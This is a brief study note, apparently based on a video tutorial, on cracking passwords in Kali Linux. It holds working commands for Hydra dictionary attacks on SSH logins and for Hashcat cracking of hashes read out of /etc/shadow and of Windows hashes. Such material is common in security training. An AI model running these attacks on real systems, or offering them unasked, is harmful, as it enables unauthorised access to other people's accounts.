# CYBER STUDY


## Kali Linux password cracking methods

https://www.youtube.com/watch?v=z4_oqTZJqCo


### Hydra for on-line hacking

Dictionary attack with list of passwords we think that might be used as password. System contains huge /usr/share/wordlists/rockyou.txt.gz file where are known password.

```bash
$ sudo gzip -d rockyou.txt.gz
$ cat rockyou.txt | wc -l
```

Make your own list of possible passwords and username if don't know one.
With userlist
```bash
$ sudo hydra -L usernames.txt -P wordlist.txt 10.0.0.10 ssh
```
and with one username example johnny.
```bash
$ sudo hydra -l "johnny" -P wordlist.txt 10.0.0.10 ssh
```
Last parameter can be example ftp,telnet...


### HashCat for off-line hacking

Need to have access somehow to /etc/shadow file.

Check what can find there. Find user's hashed password.
```bash
$ cat /etc/shadow
```
Then copy it into file hashes.txt and create another file wordlist.txt for list of possible passwords.
```bash
$ sudo hashcat -a 0 -m 1800 -o crackedpasswords.txt hashes.txt wordlist.txt
```
Hash can be placed into command line and this time windows hash type.
```bash
$ sudo hashcat -a 0 -m 1000 -o crackedpasswords.txt "<hash>" wordlist.txt
```
Look more info from manual page.
```bash
$ man hashcat
```